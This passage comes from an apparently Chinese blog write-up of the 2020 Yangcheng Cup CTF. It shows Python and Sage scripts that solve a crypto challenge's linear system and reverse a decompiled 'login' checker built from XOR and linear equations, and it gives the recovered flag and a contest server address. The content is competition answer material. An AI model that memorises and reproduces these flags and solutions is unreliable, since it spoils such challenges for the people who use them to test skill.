class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;&#x27;&#x27;352 971 218 64 892 633 999 122 123 792 727 822 719 16 780 261 264 317 721 957 517 1017 991 348 394 869 320 766 717 667 731 58 413 64 955 8506933</span></span><br><span class="line"><span class="string">1023 635 210 93 822 102 584 905 79 257 259 482 662 323 833 503 270 393 411 7 879 918 905 336 822 905 204 190 651 653 899 333 266 750 755 8980959</span></span><br><span class="line"><span class="string">309 516 404 568 599 827 371 594 332 849 596 773 39 962 860 258 669 430 439 803 720 27 349 727 637 587 806 441 668 803 82 446 959 14 504 8846004</span></span><br><span class="line"><span class="string">740 858 936 187 273 53 28 758 934 228 465 549 809 582 854 404 705 448 741 151 22 831 558 73 472 665 126 949 144 986 643 997 92 881 557 7807051</span></span><br><span class="line"><span class="string">740 158 620 912 266 1013 796 718 563 379 70 523 438 424 213 230 908 135 753 182 369 869 570 335 670 693 691 536 217 809 665 222 82 959 31 8483230</span></span><br><span class="line"><span class="string">841 673 73 676 652 87 141 148 850 360 0 380 958 839 595 431 92 65 673 698 638 491 73 462 114 414 888 364 470 526 1012 543 794 720 744 8045288</span></span><br><span class="line"><span class="string">401 490 262 971 940 535 93 1003 427 149 250 614 939 392 848 941 109 851 610 773 56 132 512 39 980 924 804 490 156 111 596 227 369 525 864 8538580</span></span><br><span class="line"><span class="string">1010 82 401 277 207 10 766 623 594 287 318 46 465 122 747 895 101 448 931 201 278 554 1007 914 524 472 861 230 65 585 504 133 858 443 169 8598174</span></span><br><span class="line"><span class="string">24 492 794 572 1002 650 185 519 556 484 215 622 765 498 818 1002 908 906 798 168 802 414 650 872 20 422 677 469 129 903 823 693 791 538 154 9669615</span></span><br><span class="line"><span class="string">193 369 816 16 832 195 350 157 788 474 842 378 221 922 58 965 345 61 512 4 940 251 705 891 506 49 427 149 552 967 649 756 164 639 88 7413954</span></span><br><span class="line"><span class="string">853 364 480 712 448 505 722 6 580 820 143 174 716 381 814 635 689 99 939 564 901 881 301 796 984 44 392 818 803 702 817 488 127 340 188 8596218</span></span><br><span class="line"><span class="string">771 953 261 317 610 8 372 794 469 874 531 629 252 393 52 919 12 568 46 970 722 306 928 597 993 442 158 385 636 226 363 302 977 138 473 8848620</span></span><br><span class="line"><span class="string">224 584 993 838 889 769 342 360 734 464 871 584 21 683 1003 465 146 665 492 309 89 212 843 4 53 191 512 535 439 325 888 343 567 427 9 7388411</span></span><br><span class="line"><span class="string">961 269 239 353 778 88 592 995 673 29 382 180 788 915 496 278 591 933 770 629 64 777 834 1015 776 763 147 192 915 986 466 256 335 380 653 9793294</span></span><br><span class="line"><span class="string">699 35 335 332 424 388 819 194 791 557 771 627 895 995 389 550 387 293 175 16 837 898 768 9 136 33 728 593 556 154 755 411 193 969 802 8135375</span></span><br><span class="line"><span class="string">749 832 428 87 475 816 331 1001 338 909 6 854 669 970 781 274 556 194 896 51 566 988 993 732 805 978 536 566 553 696 235 319 625 670 944 9922037</span></span><br><span class="line"><span class="string">908 65 915 341 838 709 234 928 732 296 437 604 685 35 750 296 379 465 207 825 239 618 837 905 544 336 854 351 270 631 641 1004 238 509 696 8712695</span></span><br><span class="line"><span class="string">208 314 374 647 286 32 275 987 819 119 522 276 313 663 18 3 521 539 115 57 783 56 647 761 122 146 544 168 277 948 661 7 219 765 452 6473121</span></span><br><span class="line"><span class="string">689 32 710 20 73 611 523 377 751 812 370 905 598 5 156 796 954 443 349 202 444 996 711 1012 831 558 254 785 297 916 98 896 749 788 134 9310929</span></span><br><span class="line"><span class="string">223 941 599 396 675 40 764 638 13 320 1013 267 370 175 733 946 845 644 271 812 727 815 683 685 753 818 686 315 378 160 529 440 877 613 220 9348582</span></span><br><span class="line"><span class="string">765 677 735 425 923 133 683 20 79 220 112 706 432 972 549 862 938 194 235 365 1004 945 696 646 157 44 700 870 168 695 162 640 687 337 623 8841182</span></span><br><span class="line"><span class="string">744 408 273 93 935 143 356 815 642 29 793 664 755 47 886 810 867 380 645 745 39 68 353 933 337 603 733 499 986 773 604 559 106 947 567 8965864</span></span><br><span class="line"><span class="string">161 85 548 849 4 843 383 209 672 761 209 149 473 776 1014 426 582 579 406 1006 367 578 234 779 20 263 155 203 649 925 106 287 696 73 461 7258983</span></span><br><span class="line"><span class="string">757 685 465 259 64 523 306 179 945 995 82 859 646 981 928 181 606 289 387 507 834 360 327 86 245 219 603 520 667 162 331 546 245 299 1000 7464039</span></span><br><span class="line"><span class="string">309 992 939 155 930 15 579 705 267 546 307 370 855 462 843 145 535 740 586 531 1003 656 600 883 801 172 322 532 803 319 643 496 835 414 72 8863792</span></span><br><span class="line"><span class="string">571 286 93 300 806 548 451 530 804 875 724 709 637 28 145 763 446 264 480 691 540 699 807 236 515 770 623 793 458 1000 470 457 965 566 379 9882639</span></span><br><span class="line"><span class="string">901 238 651 488 778 35 14 127 1022 481 261 113 486 437 252 499 74 253 211 882 150 421 496 85 60 457 999 934 827 1018 496 539 428 510 892 8009103</span></span><br><span class="line"><span class="string">348 862 994 846 671 692 1011 730 83 875 146 858 205 55 811 669 943 425 372 837 365 386 692 353 784 488 774 297 367 414 92 307 975 686 210 9357962</span></span><br><span class="line"><span class="string">966 654 48 123 703 168 757 586 129 317 330 544 211 520 309 425 600 282 906 956 394 577 728 617 910 350 458 64 651 112 610 858 536 426 819 8059368</span></span><br><span class="line"><span class="string">250 187 608 352 563 714 664 829 625 649 581 345 110 36 153 659 487 1016 14 49 850 721 276 994 209 529 404 961 808 5 109 923 839 582 992 9366682</span></span><br><span class="line"><span class="string">128 320 933 837 149 374 22 663 647 1008 844 270 530 567 451 96 525 353 888 754 153 647 183 353 772 281 148 369 286 781 134 966 123 317 68 5933023</span></span><br><span class="line"><span class="string">794 278 989 582 849 10 529 943 902 679 39 420 492 191 360 348 1020 1020 551 808 113 307 468 524 444 801 792 817 350 16 898 554 975 842 700 10213211</span></span><br><span class="line"><span class="string">420 19 983 47 541 351 1014 428 236 710 502 74 399 142 586 30 419 485 543 665 741 861 340 396 272 797 405 238 765 362 742 606 199 661 360 7518069</span></span><br><span class="line"><span class="string">764 719 234 197 99 70 38 113 546 420 969 584 176 404 751 642 364 845 702 501 509 451 161 638 87 576 346 839 93 698 98 777 516 963 898 7135907</span></span><br><span class="line"><span class="string">265 984 660 638 1009 23 951 698 400 6 913 63 911 591 187 718 655 695 49 422 974 906 1010 198 178 73 39 402 258 77 695 969 536 789 675 8524911&#x27;&#x27;&#x27;</span>.strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">A = []</span><br><span class="line">B = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">	li = k.strip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	li = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> li]</span><br><span class="line">	A.append(li[:-<span class="number">1</span>])</span><br><span class="line">	B.append(li[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(A)</span><br><span class="line"><span class="built_in">print</span>(B)</span><br></pre></td></tr></table></figure><p>放到Sage下求解一把梭：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">A = Matrix([[...],[...],[...],...,[...]]) <span class="comment">#A</span></span><br><span class="line">Y = vector([...])  <span class="comment">#B</span></span><br><span class="line">A \ Y</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911220807587.png" alt="image-20200911220807587"></p><p>将list值输入交互得flag：</p><p><img src="/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911220923352.png" alt="image-20200911220923352"></p><p><strong>flag:</strong> GWHT{4b55c1d5fb6a0234fc252b19e510301a}</p><p>​</p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><blockquote><p>快乐签到！注：得到的 flag 需要 MD5 之后再做提交</p><p>183.129.189.60:10028</p></blockquote><p>拖到IDA查看字符串发现很多Py开头的函数，肯定是python写的程序了。</p><p>python反编译，先用<strong>pyinstxtractor</strong>还原到pyc文件，再用<strong>uncompyle6</strong>还原到py文件。</p><p>开始在Python3.8环境下还原发现py文件有问题，根据提示重装至Python3.6环境，还原得到正常的<code>login.py</code>源文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.2</span></span><br><span class="line"><span class="comment"># Python bytecode 3.6 (3379)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.2 (default, Apr  1 2020, 15:52:55) </span></span><br><span class="line"><span class="comment"># [GCC 9.3.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: login.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">input1 = <span class="built_in">input</span>(<span class="string">&#x27;input something:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input1) != <span class="number">14</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong length!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    code = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">        code.append(<span class="built_in">ord</span>(input1[i]) ^ <span class="built_in">ord</span>(input1[(i + <span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line">    code.append(<span class="built_in">ord</span>(input1[<span class="number">13</span>]))</span><br><span class="line">    a1 = code[<span class="number">2</span>]</span><br><span class="line">    a2 = code[<span class="number">1</span>]</span><br><span class="line">    a3 = code[<span class="number">0</span>]</span><br><span class="line">    a4 = code[<span class="number">3</span>]</span><br><span class="line">    a5 = code[<span class="number">4</span>]</span><br><span class="line">    a6 = code[<span class="number">5</span>]</span><br><span class="line">    a7 = code[<span class="number">6</span>]</span><br><span class="line">    a8 = code[<span class="number">7</span>]</span><br><span class="line">    a9 = code[<span class="number">9</span>]</span><br><span class="line">    a10 = code[<span class="number">8</span>]</span><br><span class="line">    a11 = code[<span class="number">10</span>]</span><br><span class="line">    a12 = code[<span class="number">11</span>]</span><br><span class="line">    a13 = code[<span class="number">12</span>]</span><br><span class="line">    a14 = code[<span class="number">13</span>]</span><br><span class="line">    <span class="keyword">if</span> (a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>) &amp; (a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>) &amp; (a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>) &amp; (a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + (a8 &lt;&lt; <span class="number">7</span>) - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>) &amp; (a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>) &amp; (a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>) &amp; (a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>) &amp; (a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>) &amp; (a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>) &amp; (a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>) &amp; (a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>) &amp; (a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>) &amp; (a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>) &amp; (a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;flag is GWHT&#123;md5(your_input)&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congratulations and have fun!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Sorry,plz try again...&#x27;</span>)</span><br><span class="line"><span class="comment"># okay decompiling login.pyc</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三步，1.两两字符异或，2.打乱顺序，3.生成线性方程组。</p><p>通过Sage解线性方程组，还原<code>code</code>数组顺序，最后从后往前依次异或还原，md5哈希得flag。</p><ul><li><p>格式化+Sage解方程组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;&#x27;&#x27;(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) &amp; (a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) &amp; (a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) &amp; (a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) &amp; (a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; (a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) &amp; (a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) &amp; (a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; (a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) &amp; (a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) &amp; (a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) &amp; (a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) &amp; (a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">A = []</span><br><span class="line">B = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">	t = k.strip().strip(<span class="string">&#x27;(&#x27;</span>).strip(<span class="string">&#x27;)&#x27;</span>).split(<span class="string">&#x27;==&#x27;</span>)</span><br><span class="line">	exp = t[<span class="number">0</span>].replace(<span class="string">&#x27;a1 * &#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; + a2 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a3 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a4 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a5 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a6 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a7 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a8 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a9 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a10 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a11 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a12 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a13 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; + a14 *&#x27;</span>,<span class="string">&#x27;,&#x27;</span>).replace(<span class="string">&#x27; - a2 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a3 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a4 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a5 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a6 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a7 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a8 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a9 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a10 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a11 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a12 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a13 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; - a14 *&#x27;</span>,<span class="string">&#x27;, -&#x27;</span>).replace(<span class="string">&#x27; + (a8 &lt;&lt; 7)&#x27;</span>,<span class="string">&#x27;, &#x27;</span>+<span class="built_in">str</span>(<span class="number">2</span>**<span class="number">7</span>))</span><br><span class="line">	A.append(<span class="built_in">eval</span>(<span class="string">&#x27;[&#x27;</span>+exp+<span class="string">&#x27;]&#x27;</span>))</span><br><span class="line">	B.append(<span class="built_in">int</span>(t[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(A)</span><br><span class="line"><span class="built_in">print</span>(B)</span><br></pre></td></tr></table></figure><p><img src="/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20200911223003888.png" alt="image-20200911223003888"></p></li><li><p>还原<code>code</code>数组顺序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ind = [<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>]</span><br><span class="line">out = [<span class="number">119</span>, <span class="number">24</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">104</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">52</span>, <span class="number">108</span>, <span class="number">88</span>, <span class="number">74</span>, <span class="number">88</span>, <span class="number">33</span>]</span><br><span class="line"></span><br><span class="line">ori = [out[ind.index(i)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"><span class="built_in">print</span>(ori)</span><br><span class="line"><span class="comment">#[10, 24, 119, 7, 104, 43, 28, 91, 108, 52, 88, 74, 88, 33]</span></span><br></pre></td></tr></table></figure></li><li><p>字符异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">out = [<span class="number">10</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">7</span>, <span class="number">104</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">52</span>, <span class="number">88</span>, <span class="number">74</span>, <span class="number">88</span>, <span class="number">33</span>]</span><br><span class="line">flag = out[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">	flag[i] ^= flag[i+<span class="number">1</span>]</span><br><span class="line">	</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> flag]))</span><br><span class="line"><span 